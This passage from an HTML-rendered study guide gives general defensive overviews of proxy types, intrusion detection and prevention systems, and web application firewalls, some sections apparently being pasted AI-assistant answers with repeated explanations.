<p><strong>Hardening and Configuration Management</strong>: Follow security best practices and guidelines for hardening the proxy server configuration, minimizing the attack surface, and reducing potential security vulnerabilities. Disable unnecessary services, ports, and protocols, apply access controls, and configure firewall rules to restrict inbound and outbound traffic to trusted sources and destinations.</p>
</li>
<li>
<p><strong>Regular Security Audits and Penetration Testing</strong>: Conduct periodic security audits, vulnerability assessments, and penetration tests to evaluate the effectiveness of proxy server security controls, identify weaknesses or misconfigurations, and remediate security gaps proactively. Engage third-party security professionals or consultants to perform independent assessments and validate the resilience of proxy server defenses against potential threats and attacks.</p>
</li>
</ol>
<p>By addressing these security considerations, organizations can enhance the resilience of their proxy server infrastructure and mitigate the risks associated with web traffic management, content filtering, and secure access control.</p>
<h2 id="network-proxy-security-benefits-and-risks"><a class="header" href="#network-proxy-security-benefits-and-risks">Network Proxy Security: Benefits and Risks</a></h2>
<p>Network proxies act as intermediaries between your device and the internet, providing additional features like filtering content, caching data, and obscuring your IP address.

<div style="break-before: page; page-break-before: always;"></div><h1 id="proxy-examples"><a class="header" href="#proxy-examples">Proxy examples</a></h1>
<p>Certainly! Here are examples of different types of proxies commonly used in networking and cybersecurity:</p>
<ol>
<li>
<p><strong>Web Proxy</strong>: A web proxy acts as an intermediary between a client (such as a web browser) and the internet. It forwards client requests to web servers and returns the responses to the clients. Web proxies are often used for caching, content filtering, access control, and anonymization. Examples include Squid Proxy, Apache HTTP Server with mod_proxy module, and Nginx with proxy_pass directive.</p>
</li>
<li>
<p><strong>Transparent Proxy</strong>: A transparent proxy intercepts client requests without requiring any configuration on the client side. It redirects traffic to the proxy server automatically, allowing for content filtering, caching, and access control without the need for explicit client settings. Examples include Squid Proxy with transparent proxying enabled and pfSense with Squid and SquidGuard packages.</p>
</li>
<li>
<p><strong>Reverse Proxy</strong>: A reverse proxy sits in front of web servers and handles incoming client requests on their behalf. It distributes requests among multiple backend servers, performs load balancing, and provides additional security features such as SSL termination, content caching, and application firewalling. Examples include Nginx, Apache HTTP Server with mod_proxy and mod_rewrite modules, and HAProxy.</p>
</li>
<li>
<p><strong>Forward Proxy</strong>: A forward proxy forwards client requests to the internet on behalf of the clients. It is typically deployed within an internal network to control and monitor outbound traffic, enforce access policies, and provide anonymity for internal users. Examples include Squid Proxy, Microsoft Forefront Threat Management Gateway (TMG), and Blue Coat ProxySG.</p>
</li>
<li>
<p><strong>Anonymous Proxy</strong>: An anonymous proxy hides the IP address of the client, providing anonymity and privacy for internet users. It forwards requests to web servers without revealing the client's original IP address, making it difficult for websites to track or identify the user's location. Examples include Tor (The Onion Router), HideMyAss, and ProxySite.com.</p>
</li>
<li>
<p><strong>VPN (Virtual Private Network)</strong>: A VPN creates a secure encrypted tunnel between the client device and a VPN server, effectively masking the client's IP address and encrypting all traffic transmitted over the internet. VPNs provide privacy, security, and anonymity for users by hiding their online activities from prying eyes. Examples include OpenVPN, Cisco AnyConnect, and NordVPN.</p>
</li>
<li>
<p><strong>SOCKS Proxy</strong>: A SOCKS (Socket Secure) proxy forwards network traffic at the transport layer (Layer 4) of the OSI model, supporting various protocols such as TCP, UDP, and ICMP. It can be used for routing, tunneling, and bypassing firewall restrictions, offering flexibility and compatibility with a wide range of applications. Examples include Dante, Shadowsocks, and Tor (when configured as a SOCKS proxy).</p>
</li>
<li>
<p><strong>Content Filtering Proxy</strong>: A content filtering proxy inspects web traffic and applies filtering policies to block access to malicious or inappropriate content, enforce acceptable use policies, and protect against security threats. It categorizes websites based on content type, URL reputation, and threat intelligence feeds, allowing organizations to control access to specific categories of websites. Examples include Barracuda Web Filter, McAfee Web Gateway, and Sophos UTM.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="ids"><a class="header" href="#ids">IDS</a></h1>
<p>GitHub Copilot: An Intrusion Detection System (IDS) is a device or software application that monitors a network or systems for malicious activity or policy violations. IDS systems are used to detect various types of malicious network traffic and computer usage that can't be detected by a conventional firewall. This includes network attacks against vulnerable services, data driven attacks on applications, host-based attacks such as privilege escalation, unauthorized logins and access to sensitive files, and malware.</p>
<p>Here's a simplified explanation of how an IDS works:</p>
<ol>
<li>
<p><strong>Monitoring</strong>: An IDS monitors network traffic for suspicious activity or abnormalities. It can be network-based (NIDS) to monitor network traffic, or host-based (HIDS) to monitor events on a single host.</p>
</li>
<li>
<p><strong>Analysis</strong>: The IDS analyzes the traffic and compares it against a database of known threat signatures, or uses anomaly detection to identify behavior that deviates from the &quot;normal&quot; baseline established by the system.</p>
</li>
<li>
<p><strong>Alerting</strong>: If the IDS detects suspicious activity or policy violations, it sends alerts to the network administrator. The alert could be something simple like a notification, or something more complex like a security incident event management system.</p>
</li>
<li>
<p><strong>Prevention</strong>: Some IDS systems also have the ability to take action when a threat is detected, such as blocking traffic from the offending IP address or user. This type of system is often referred to as an intrusion prevention system (IPS).</p>
</li>
<li>
<p><strong>Logging</strong>: IDS systems also typically provide logging and reporting capabilities, which can be used for forensic analysis, incident response, and auditing purposes.</p>
</li>
</ol>
<p>Remember, while an IDS can significantly enhance network security, it's not a silver bullet. It should be used as part of a layered security approach, in conjunction with other security measures like firewalls, anti-malware software, and user training.</p>
<p>An Intrusion Detection System (IDS) is a network or host-based security system that monitors network traffic or system activities to detect and respond to unauthorized or suspicious behavior and potential security threats. The primary function of an IDS is to identify security incidents and raise alerts so that appropriate action can be taken. Here's how an IDS works and its key components:</p>
<p><strong>Network-Based IDS (NIDS)</strong>:</p>
<ol>
<li>
<p><strong>Packet Capture</strong>: A Network-Based IDS monitors network traffic by capturing packets from the network. It can passively listen to network traffic using network interfaces or tap into network segments.</p>
</li>
<li>
<p><strong>Traffic Analysis</strong>: The IDS analyzes captured network traffic to detect suspicious patterns, anomalies, or known attack signatures. It compares the observed network traffic against a database of predefined attack signatures.</p>
</li>
<li>
<p><strong>Alert Generation</strong>: When the IDS detects a potential security threat, it generates alerts and notifications, which are sent to the network administrator or a security operations center (SOC). The alerts provide details about the suspicious activity, including the source and destination IP addresses, the type of attack or incident, and the time of occurrence.</p>
</li>
<li>
<p><strong>Logging and Reporting</strong>: IDS systems often maintain logs of detected incidents for forensic analysis. They can generate reports for security teams to review the network's overall security posture.</p>
</li>
<li>
<p><strong>Response Actions</strong>: While the primary function of an IDS is to detect and alert, some advanced IDS systems can take automated response actions, such as blocking or isolating the source of the threat to prevent further damage.</p>
</li>
</ol>
<p><strong>Host-Based IDS (HIDS)</strong>:</p>
<ol>
<li>
<p><strong>Log and Event Monitoring</strong>: A Host-Based IDS monitors activities and logs on individual hosts or devices. It tracks events such as file system changes, application launches, login attempts, and system configuration changes.</p>
</li>
<li>
<p><strong>Behavior Analysis</strong>: The HIDS uses predefined rules and behavioral analysis to detect abnormal or suspicious activities on the host. This includes identifying unauthorized access, malware infections, and configuration changes that deviate from a known baseline.</p>
</li>
<li>
<p><strong>Alert Generation</strong>: When the HIDS detects unusual or potentially malicious activities, it generates alerts or notifications. These alerts are typically sent to the host's local administrator or a centralized security monitoring system.</p>
</li>
<li>
<p><strong>Response and Remediation</strong>: Depending on the configuration, a HIDS may be set to take actions in response to detected threats, such as blocking or isolating the compromised host, terminating malicious processes, or rolling back unauthorized changes.</p>
</li>
</ol>
<p><strong>IDS Components</strong>:</p>
<ol>
<li>
<p><strong>Sensors</strong>: Sensors are responsible for capturing and analyzing network traffic (in the case of NIDS) or monitoring host activities (in the case of HIDS).</p>
</li>
<li>
<p><strong>Alert Engine</strong>: The IDS uses an alert engine to process and correlate the collected data, compare it against predefined rules or signatures, and generate alerts.</p>
</li>
<li>
<p><strong>Database of Signatures</strong>: The IDS relies on a database of known attack signatures and patterns to identify threats. This database is regularly updated to stay current with emerging threats.</p>
</li>
<li>
<p><strong>Alerting and Reporting</strong>: The IDS provides alerting and reporting capabilities, allowing administrators to review and act upon detected incidents.</p>
</li>
<li>
<p><strong>Management Console</strong>: A central management console provides a user interface for configuring the IDS, viewing alerts, and managing policies.</p>
</li>
</ol>
<p>Intrusion Detection Systems play a critical role in network and host security, helping organizations detect and respond to security incidents in a timely manner. They complement other security measures like firewalls and antivirus software to provide a layered defense against various threats.</p>
<p>Intrusion Detection System (IDS) is a network security device that monitors network traffic for suspicious activity. It analyzes incoming and outgoing data packets to identify patterns that may indicate an attack. IDS can be used to alert network administrators to potential threats, allowing them to take corrective action.</p>
<p><strong>How IDS Works</strong></p>
<p>IDS can work in two main modes:</p>
<ul>
<li>
<p><strong>Signature-based detection:</strong> This mode uses a database of known attack signatures to compare against incoming traffic. If a match is found, an alert is generated.</p>
</li>
<li>
<p><strong>Anomaly-based detection:</strong> This mode looks for deviations from normal network traffic patterns. If an anomaly is detected, an alert is generated.</p>
</li>
</ul>
<p>IDS can also be deployed as a host-based IDS (HIDS) or a network-based IDS (NIDS). HIDS is installed on a host computer to monitor traffic to and from that host. NIDS is deployed on a network device to monitor traffic on the entire network.</p>
<p><strong>Types of IDS</strong></p>
<p>There are several types of IDS, including:</p>
<ul>
<li>
<p><strong>Network-based IDS (NIDS):</strong> Monitors network traffic for suspicious activity.</p>
</li>
<li>
<p><strong>Host-based IDS (HIDS):</strong> Monitors activity on a host computer.</p>
</li>
<li>
<p><strong>Wireless IDS (WIDS):</strong> Monitors wireless network traffic.</p>
</li>
<li>
<p><strong>Content-based IDS (CBIDS):</strong> Analyzes the content of data packets to identify suspicious activity.</p>
</li>
</ul>
<p><strong>Benefits of IDS</strong></p>
<p>IDS offer several benefits, including:</p>
<ul>
<li>
<p><strong>Early warning:</strong> IDS can provide an early warning of potential threats, allowing network administrators to take corrective action before the attack is successful.</p>
</li>
<li>
<p><strong>Reduced downtime:</strong> By identifying and preventing attacks, IDS can help to reduce downtime and improve the availability of critical systems.</p>
</li>
<li>
<p><strong>Improved security posture:</strong> IDS can help to improve the overall security posture of a network by providing visibility into network activity and identifying potential threats.</p>
</li>
</ul>
<p><strong>Challenges of IDS</strong></p>
<p>IDS also have some challenges, including:</p>
<ul>
<li>
<p><strong>false positives:</strong> IDS may generate false positive alerts, which can lead to wasted time and resources.</p>
</li>
<li>
<p><strong>false negatives:</strong> IDS may fail to detect some attacks, which can allow attackers to gain access to a network.</p>
</li>
<li>
<p><strong>scalability:</strong> IDS can be difficult to scale to large networks.</p>
</li>
</ul>
<p>Despite these challenges, IDS are an essential component of network security. They can provide valuable insights into network activity and help to identify potential threats before they can cause damage.</p>

<p>An Intrusion Detection System (IDS) acts as a <strong>security watchdog</strong>, continuously monitoring network traffic and system activities for signs of suspicious or malicious activity. While not directly preventing intrusions, it plays a vital role in <strong>detecting and alerting</strong> security teams to potential threats, allowing them to take timely action.</p>
<p><strong>How IDS Security Works:</strong></p>
<p>IDS security employs various techniques to identify potential intrusions, such as:</p>
<ul>
<li><strong>Signature-based detection:</strong> Compares network traffic or system activity to known patterns or signatures of malicious attacks stored in a database.</li>
<li><strong>Anomaly-based detection:</strong> Analyzes deviations from normal network or system behavior patterns to identify potential threats, even if they haven't been encountered before.</li>
<li><strong>Hybrid approaches:</strong> Combine both signature-based and anomaly-based detection for a more comprehensive approach.</li>
</ul>
<p><strong>Benefits of IDS Security:</strong></p>
<ul>
<li><strong>Early detection of threats:</strong> IDS can identify suspicious activity early, allowing security teams to take action before significant damage occurs.</li>
<li><strong>Improved security posture:</strong> By proactively monitoring for threats, IDS helps organizations maintain a better overall security posture.</li>
<li><strong>Compliance with regulations:</strong> Some industries have regulations requiring organizations to implement intrusion detection systems for data security.</li>
<li><strong>Provides valuable insights:</strong> IDS logs can be analyzed to gain deeper insights into attack patterns and adjust security strategies accordingly.</li>
</ul>
<p><strong>Limitations of IDS Security:</strong></p>
<ul>
<li><strong>False positives:</strong> IDS can sometimes generate false alarms due to unusual behaviors that may not necessarily be malicious.</li>
<li><strong>Evasion techniques:</strong> Advanced attackers may use techniques to evade detection by IDS systems.</li>
<li><strong>Requires ongoing maintenance:</strong> Maintaining an accurate signature database and keeping the IDS system itself up-to-date is crucial.</li>
<li><strong>Limited action:</strong> IDS primarily detects and alerts, requiring further action from security teams for mitigation.</li>
</ul>
<p><strong>Types of Intrusion Detection Systems:</strong></p>
<ul>
<li><strong>Network Intrusion Detection System (NIDS):</strong> Monitors network traffic for suspicious activity.</li>
<li><strong>Host-based Intrusion Detection System (HIDS):</strong> Monitors a single system (e.g., server) for suspicious activity on the operating system or applications.</li>
<li><strong>Hybrid Intrusion Detection System:</strong> Combines NIDS and HIDS for comprehensive monitoring.</li>
</ul>
<p><strong>Enhancing IDS Security:</strong></p>
<ul>
<li><strong>Regularly update signatures and software:</strong> Ensure your IDS has access to the latest threat signatures and system updates.</li>
<li><strong>Fine-tune detection rules:</strong> Adjust detection rules to minimize false positives and ensure sensitivity to real threats.</li>
<li><strong>Integrate with other security solutions:</strong> IDS should be part of a layered security approach, working alongside firewalls, anti-malware software, and security information and event management (SIEM) systems.</li>
<li><strong>Invest in skilled personnel:</strong> Having trained security personnel who can effectively analyze IDS alerts and respond to incidents is essential.</li>
</ul>
<p><strong>Conclusion:</strong></p>
<p>An IDS is a valuable tool for enhancing network and system security by detecting and alerting to potential threats. However, it should be seen as part of a broader security strategy, combined with other security measures and complemented by human expertise for effective protection.</p>
<p>Securing an Intrusion Detection System (IDS) is crucial to ensure its effectiveness in detecting and responding to security threats. Here are some key considerations for IDS security:</p>
<ol>
<li>
<p><strong>Placement and Segmentation</strong>: Deploy the IDS strategically within the network architecture to monitor traffic effectively. Place IDS sensors at critical network choke points, such as perimeter gateways, internal network segments, and data centers, to detect inbound and outbound threats. Segment the IDS deployment to focus on specific network zones or assets of higher importance.</p>
</li>
<li>
<p><strong>Access Control</strong>: Restrict access to the IDS management interface and administrative functions to authorized personnel only. Implement strong authentication mechanisms, such as multifactor authentication (MFA) and role-based access control (RBAC), to prevent unauthorized access to configuration settings, sensor data, and alert logs.</p>
</li>
<li>
<p><strong>Secure Communication</strong>: Encrypt communication channels between IDS components, including sensors, management consoles, and logging servers, to protect sensitive information from eavesdropping and tampering. Use secure protocols such as SSH (Secure Shell), SSL/TLS (Secure Sockets Layer/Transport Layer Security), and IPsec (Internet Protocol Security) for data transmission and remote access.</p>
</li>
<li>
<p><strong>Configuration Hardening</strong>: Harden the configuration of IDS sensors and management consoles to minimize potential security vulnerabilities and reduce the attack surface. Disable unnecessary services, ports, and protocols, apply access controls, and regularly update firmware/software to patch known vulnerabilities and mitigate security risks.</p>
</li>
<li>
<p><strong>Continuous Monitoring</strong>: Monitor the health and performance of IDS components continuously to detect and respond to potential security incidents, system failures, or configuration errors promptly. Set up automated alerts and notifications for critical events, such as sensor offline, high CPU utilization, or storage capacity exceeded, to ensure timely remediation actions.</p>
</li>
<li>
<p><strong>Update and Patch Management</strong>: Keep IDS software, firmware, and signature databases up-to-date with the latest patches, updates, and security definitions to defend against emerging threats and vulnerabilities. Establish a formal update management process to assess, test, and deploy updates regularly without disrupting IDS operation or network connectivity.</p>
</li>
<li>
<p><strong>Anomaly Detection</strong>: Configure IDS sensors to detect anomalous behavior and deviations from normal network patterns, such as unexpected traffic volume, protocol anomalies, and abnormal user activity. Use anomaly-based detection techniques, statistical analysis, and machine learning algorithms to identify potential security breaches and insider threats.</p>
</li>
<li>
<p><strong>Integration with Security Operations</strong>: Integrate IDS with security information and event management (SIEM) systems, incident response platforms, and threat intelligence feeds to correlate and analyze security events, enrich alert data with contextual information, and automate response actions. Streamline incident detection, investigation, and remediation workflows to improve overall security posture and incident response capabilities.</p>
</li>
<li>
<p><strong>Regular Audits and Testing</strong>: Conduct periodic security audits, vulnerability assessments, and penetration tests to evaluate the effectiveness of IDS defenses, identify misconfigurations or weaknesses, and validate compliance with security policies and regulatory requirements. Engage third-party security professionals or consultants to perform independent assessments and provide actionable recommendations for improvement.</p>
</li>
<li>
<p><strong>Security Awareness Training</strong>: Educate IDS administrators, analysts, and other stakeholders about the importance of IDS security, best practices for configuration and management, and common attack vectors and evasion techniques. Provide training on incident response procedures, threat hunting techniques, and effective use of IDS tools and capabilities to enhance detection and response capabilities.</p>
</li>
</ol>
<p>By addressing these security considerations, organizations can strengthen the resilience of their Intrusion Detection Systems and improve their ability to detect, mitigate, and respond to security threats effectively.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="ips"><a class="header" href="#ips">IPS</a></h1>
<p>GitHub Copilot: An Intrusion Prevention System (IPS) is a network security/threat prevention technology that examines network traffic flows to detect and prevent vulnerability exploits, which are actual attempts to disrupt the confidentiality, integrity or availability of a network.</p>
<p>Here's a simplified explanation of how an IPS works:</p>
<ol>
<li>
<p><strong>Monitoring</strong>: Similar to an Intrusion Detection System (IDS), an IPS monitors network traffic. However, because an exploit may be carried out very quickly after the attacker gains access, intrusion prevention systems also have the ability to take immediate action.</p>
</li>
<li>
<p><strong>Analysis</strong>: The IPS analyzes the traffic and compares it against a database of known threat signatures, or uses anomaly detection to identify behavior that deviates from the &quot;normal&quot; baseline established by the system.</p>
</li>
<li>
<p><strong>Prevention</strong>: If the IPS detects a threat, it takes action to block it. This is the key difference between an IPS and an IDS (Intrusion Detection System). While an IDS passively alerts administrators about potential security threats, an IPS is configured to automatically block those threats.</p>
</li>
<li>
<p><strong>Alerting</strong>: Like an IDS, an IPS also sends alerts to the network administrator when it detects and blocks a threat.</p>
</li>
<li>
<p><strong>Logging</strong>: IPS systems also typically provide logging and reporting capabilities, which can be used for forensic analysis, incident response, and auditing purposes.</p>
</li>
</ol>
<p>Remember, an IPS can be a valuable addition to your network security, but it should be used as part of a layered security approach. It's also important to keep the IPS updated with the latest threat signatures to ensure it can protect against the most recent threats.</p>
<p>An Intrusion Prevention System (IPS) is a network security device or software application designed to identify and block potential threats and security vulnerabilities in real-time. It goes beyond the capabilities of Intrusion Detection Systems (IDS) by actively taking action to prevent or block malicious activities and network intrusions. Here's how an IPS works and its key components:</p>
<p><strong>Network-Based IPS (NIPS):</strong></p>
<ol>
<li>
<p><strong>Packet Capture</strong>: Similar to an Intrusion Detection System (IDS), a Network-Based IPS captures network traffic by monitoring packets flowing through the network. It examines the content of packets, including source and destination IP addresses, port numbers, and payload data.</p>
</li>
<li>
<p><strong>Traffic Analysis</strong>: The IPS analyzes network traffic to detect known attack signatures, suspicious patterns, and anomalies. It uses predefined rules and policies to identify malicious activities, such as network scans, malware payloads, and known attack techniques.</p>
</li>
<li>
<p><strong>Alert Generation</strong>: When the IPS identifies a potential security threat, it generates alerts and notifications, much like an IDS. The alerts contain details about the threat, including the type of attack, source and destination information, and the time of the event.</p>
</li>
<li>
<p><strong>Blocking and Prevention</strong>: What sets an IPS apart from an IDS is its capability to take proactive actions to prevent threats. It can block malicious traffic, disconnect or isolate compromised hosts, and apply access controls to mitigate the impact of security incidents.</p>
</li>
<li>
<p><strong>Logging and Reporting</strong>: IPS systems maintain logs of security events, which can be used for forensic analysis and compliance reporting. They provide insights into the security posture of the network.</p>
</li>
</ol>
<p><strong>Host-Based IPS (HIPS):</strong></p>
<ol>
<li>
<p><strong>System Monitoring</strong>: A Host-Based IPS focuses on individual hosts or devices, monitoring system activities, processes, file systems, and configuration changes.</p>
</li>
<li>
<p><strong>Behavior Analysis</strong>: The HIPS uses predefined rules and behavioral analysis to detect and respond to abnormal activities on the host. It can identify unauthorized access, malware execution, privilege escalation attempts, and other suspicious actions.</p>
</li>
<li>
<p><strong>Alert Generation</strong>: When the HIPS identifies a potential threat, it generates alerts or notifications, signaling the host administrator or a centralized security monitoring system.</p>
</li>
<li>
<p><strong>Response Actions</strong>: Similar to NIPS, a HIPS can take automated response actions, such as blocking or isolating the compromised host, terminating malicious processes, or restoring configurations to their original state.</p>
</li>
</ol>
<p><strong>IPS Components:</strong></p>
<ol>
<li>
<p><strong>Sensors</strong>: Sensors are responsible for monitoring and analyzing network traffic (in the case of NIPS) or host activities (in the case of HIPS).</p>
</li>
<li>
<p><strong>Alert Engine</strong>: The IPS includes an alert engine that processes and correlates data to detect threats. It generates alerts based on predefined rules, signatures, and behavior analysis.</p>
</li>
<li>
<p><strong>Database of Signatures</strong>: An IPS relies on a database of known attack signatures and patterns to identify and block threats. Regular updates to this database are essential to stay current with emerging threats.</p>
</li>
<li>
<p><strong>Alerting and Reporting</strong>: IPS devices offer alerting and reporting capabilities to assist administrators in managing and responding to detected incidents.</p>
</li>
<li>
<p><strong>Management Console</strong>: A central management console provides a user interface for configuring the IPS, defining policies, reviewing alerts, and managing security rules.</p>
</li>
</ol>
<p>Intrusion Prevention Systems play a vital role in network and host security by actively preventing and mitigating security threats in real-time. They are a critical component of a comprehensive security strategy, providing proactive protection against a wide range of cyber threats.</p>
<p>Intrusion Prevention System (IPS) is a network security device that monitors network traffic and takes action to prevent potential threats. It works by analyzing incoming and outgoing data packets to identify patterns that may indicate an attack. If an attack is detected, the IPS can take several actions, such as:</p>
<ul>
<li>
<p><strong>Blocking the attack:</strong> This is the most common action taken by an IPS. It prevents the attack from being successful by preventing the malicious traffic from entering or leaving the network.</p>
</li>
<li>
<p><strong>Resetting the connection:</strong> This action is often used when a malicious user has already gained access to a network. It will reset the connection to the affected device, which will force the attacker to re-authenticate.</p>
</li>
<li>
<p><strong>Sending an alert:</strong> This action is used to notify the network administrator of the attack. This can help the administrator to take further action to protect the network.</p>
</li>
</ul>
<p>IPS can be deployed as a host-based IPS (HIPS) or a network-based IPS (NIPS). HIPS is installed on a host computer to monitor traffic to and from that host. NIPS is deployed on a network device to monitor traffic on the entire network.</p>
<p><strong>Types of IPS</strong></p>
<p>There are several types of IPS, including:</p>
<ul>
<li>

</li>
<li>
<p><strong>Wireless IPS (WIPS):</strong> Monitors wireless network traffic.</p>
</li>
<li>
<p><strong>Content-based IPS (CBIPS):</strong> Analyzes the content of data packets to identify suspicious activity.</p>
</li>
</ul>
<p><strong>Benefits of IPS</strong></p>
<p>IPS offer several benefits, including:</p>

</li>
<li>
<p><strong>Improved security posture:</strong> IPS can help to improve the overall security posture of a network by providing visibility into network activity and identifying potential threats.</p>
</li>
</ul>
<p><strong>Challenges of IPS</strong></p>
<p>IPS also have some challenges, including:</p>
<ul>
<li>
<p><strong>false positives:</strong> IPS may generate false positive alerts, which can lead to wasted time and resources.</p>
</li>
<li>
<p><strong>false negatives:</strong> IPS may fail to detect some attacks, which can allow attackers to gain access to a network.</p>
</li>
<li>
<p><strong>scalability:</strong> IPS can be difficult to scale to large networks.</p>

<p>Intrusion Prevention System (IPS) security builds upon the foundation of Intrusion Detection Systems (IDS) by taking a more proactive approach.  While IDS excels at identifying and alerting about suspicious activity, IPS actively works to prevent those threats from succeeding. </p>
<p>Here's a breakdown of IPS security and its role in your overall network defense strategy:</p>
<p><strong>How IPS Security Works:</strong></p>
<ul>
<li><strong>Leverages Detection Techniques:</strong> IPS inherits many detection techniques from IDS, such as signature-based and anomaly-based detection, to identify potential intrusions.</li>
<li><strong>Takes Action:</strong>  The key difference lies in its ability to take preventive actions like:
<ul>
<li><strong>Blocking malicious traffic:</strong> IPS can block suspicious packets or network traffic at the firewall level, preventing them from reaching your network and potentially harming systems.</li>
<li><strong>Terminating connections:</strong> IPS can terminate established connections deemed harmful, stopping ongoing attacks and limiting potential damage.</li>
<li><strong>Dynamically reconfiguring security controls:</strong>  Some advanced IPS systems can adjust firewall rules or other security measures on the fly to adapt to evolving threats.</li>
</ul>
</li>
</ul>
<p><strong>Benefits of IPS Security:</strong></p>
<ul>
<li><strong>Proactive Threat Prevention:</strong>  Provides a more robust defense by actively blocking threats before they can cause harm.</li>
<li><strong>Reduced Attack Impact:</strong>  By preventing intrusions, IPS can minimize potential damage to systems and data.</li>
<li><strong>Improved Network Performance:</strong>  Blocking malicious traffic at the network level can help improve overall network performance.</li>
<li><strong>Enhanced Security Posture:</strong>  Strengthens your security posture by adding an additional layer of defense beyond detection.</li>
</ul>
<p><strong>Limitations of IPS Security:</strong></p>
<ul>
<li><strong>False Positives:</strong>  Like IDS, IPS can generate false positives, potentially blocking legitimate traffic. Careful configuration and tuning are crucial.</li>
<li><strong>Evolving Threats:</strong>  Advanced attackers may develop techniques to evade IPS detection.</li>
<li><strong>Performance Overhead:</strong>  Extensive inspection of network traffic can introduce some overhead, impacting network performance. </li>
<li><strong>Configuration Complexity:</strong>  Proper configuration of IPS rules and actions requires technical expertise.</li>
</ul>
<p><strong>Enhancing IPS Security:</strong></p>
<ul>
<li><strong>Regular Updates:</strong>  Maintain up-to-date threat signatures and system software to ensure effectiveness against evolving threats.</li>
<li><strong>Fine-tuning Rules:</strong>  Carefully configure IPS rules to minimize false positives and ensure detection of real threats.</li>
<li><strong>Layered Security:</strong>  IPS works best as part of a layered security approach, alongside firewalls, anti-malware software, and security information and event management (SIEM) systems.</li>
<li><strong>Invest in Expertise:</strong>  Having skilled personnel to manage, monitor, and fine-tune the IPS is essential for optimal effectiveness.</li>
</ul>
<p><strong>Conclusion:</strong></p>
<p>Intrusion Prevention Systems play a vital role in modern network security by actively preventing intrusions and enhancing your overall defense posture.  However, it's important to  acknowledge its limitations and integrate it with other security solutions for comprehensive protection. </p>
<p>Securing an Intrusion Prevention System (IPS) is crucial to ensure its effectiveness in identifying and mitigating security threats. Here are some key considerations for IPS security:</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="waf"><a class="header" href="#waf">WAF</a></h1>
<p>GitHub Copilot: A Web Application Firewall (WAF) is a specific form of application firewall that filters, monitors, and blocks HTTP traffic to and from a web application. A WAF protects a web application by controlling its input, output, and access to and from the application.</p>
<p>Here's a simplified explanation of how a WAF works:</p>
<ol>
<li>
<p><strong>Policy Creation</strong>: A WAF operates through what are known as &quot;policies&quot; or &quot;rules&quot;. These are typically predefined security policies that protect against common exploits, such as Cross-Site Scripting (XSS) and SQL Injection, among others.</p>
</li>
<li>
<p><strong>Traffic Inspection</strong>: The WAF analyzes HTTP/HTTPS requests coming in before they reach the web application. It uses a process of whitelisting, blacklisting, and inspection to determine whether the traffic is malicious or safe.</p>
</li>
<li>
<p><strong>Whitelisting and Blacklisting</strong>: Whitelisting allows only specified traffic to access the web application, while blacklisting blocks specified traffic. These lists are defined based on IP addresses, HTTP headers, URL strings, and more.</p>
</li>
<li>
<p><strong>Threat Detection</strong>: If a threat is detected, the WAF will take action based on its rule configuration. This could be blocking the request, allowing it with a warning, or stripping out the malicious part of the request.</p>
</li>
<li>
<p><strong>Logging</strong>: WAFs also typically provide logging and reporting capabilities, which can be used for forensic analysis, incident response, and auditing purposes.</p>
</li>
</ol>
<p>Remember, a WAF is an important part of a comprehensive security strategy, but it should be used in conjunction with other security measures. It's also important to keep the WAF updated with the latest threat signatures to ensure it can protect against the most recent threats.</p>
<p>A Web Application Firewall (WAF) is a security device or software application that protects web applications from various online threats and vulnerabilities. It sits between a web application and its users, monitoring and filtering incoming web traffic to identify and block malicious requests and attacks. Here's how a WAF works and its key functions:</p>
<p><strong>How a Web Application Firewall Works</strong>:</p>
<ol>
<li>
<p><strong>Traffic Inspection</strong>: The WAF continuously inspects incoming web traffic, analyzing both HTTP and HTTPS requests, including HTTP headers and payload data.</p>
</li>
<li>
<p><strong>Request Analysis</strong>: The WAF evaluates web requests for potential threats, vulnerabilities, and anomalies. It checks for known attack patterns, such as SQL injection, cross-site scripting (XSS), cross-site request forgery (CSRF), and other common web application attacks.</p>
</li>
<li>
<p><strong>Rule-Based Filtering</strong>: WAFs use predefined security rules and policies to filter and process incoming requests. These rules can be customized to match the specific security requirements of the web application.</p>
</li>
<li>
<p><strong>Signature-Based Detection</strong>: The WAF compares incoming requests to a database of known attack signatures, which are patterns or characteristics associated with known attacks. If a request matches a known signature, it's blocked or flagged for further investigation.</p>
</li>
<li>
<p><strong>Behavioral Analysis</strong>: Some advanced WAFs incorporate behavioral analysis to identify abnormal patterns of traffic that may indicate attacks or other security incidents. Behavioral analysis can help detect zero-day attacks (previously unknown vulnerabilities).</p>
</li>
<li>
<p><strong>Rate Limiting</strong>: WAFs can enforce rate limiting to control the number of requests from a single IP address within a specific time frame. This helps mitigate distributed denial-of-service (DDoS) attacks and brute-force login attempts.</p>
</li>
<li>
<p><strong>Session Management</strong>: WAFs can monitor and enforce session management, ensuring that session-related requests are legitimate and secure. This helps protect against session fixation and hijacking attacks.</p>
</li>
<li>
<p><strong>Positive Security Model</strong>: Some WAFs implement a positive security model, which defines what allowed, legitimate requests should look like. This model helps filter out malicious requests that deviate from the expected behavior.</p>
</li>
<li>
<p><strong>Logging and Reporting</strong>: The WAF logs detected incidents and security events, providing administrators with insights into the threats facing the web application. These logs can be used for forensic analysis and compliance reporting.</p>
</li>
<li>
<p><strong>Response Actions</strong>: Depending on the configuration, a WAF can take various response actions. These actions can include blocking the malicious request, redirecting it to a different URL, or issuing a challenge (e.g., CAPTCHA) to the user to verify their legitimacy.</p>
</li>
<li>
<p><strong>Learning Mode</strong>: Some WAFs include learning modes that allow them to analyze and adapt to the traffic over time. During this mode, the WAF learns the normal behavior of the web application, enabling it to create accurate security rules.</p>
</li>
</ol>
<p>Web Application Firewalls are essential for protecting web applications from a wide range of threats, including those that exploit vulnerabilities in the application code. They add an additional layer of security to complement secure coding practices and application development efforts. WAFs are commonly used to protect websites, web services, and online applications from cyberattacks and data breaches.</p>
<p><strong>WAFs vs. Network Firewalls</strong>:</p>
<p>A WAF is different from a network firewall, which is designed to protect the network infrastructure. A network firewall filters traffic based on IP addresses, ports, and protocols, while a WAF filters traffic based on the content of the HTTP/HTTPS requests. A WAF is typically deployed in front of a web application, while a network firewall is deployed at the network perimeter.</p>
<p><strong>WAFs vs. Intrusion Detection Systems</strong>:</p>
<p>A WAF is also different from an intrusion detection system (IDS), which monitors network traffic for suspicious activity. A WAF is designed to protect a specific web application, while an IDS is designed to protect the entire network. A WAF can be deployed as a network-based or host-based solution, while an IDS is typically deployed as a network-based solution.</p>
<p><strong>WAFs vs. Anti-Malware Software</strong>:</p>
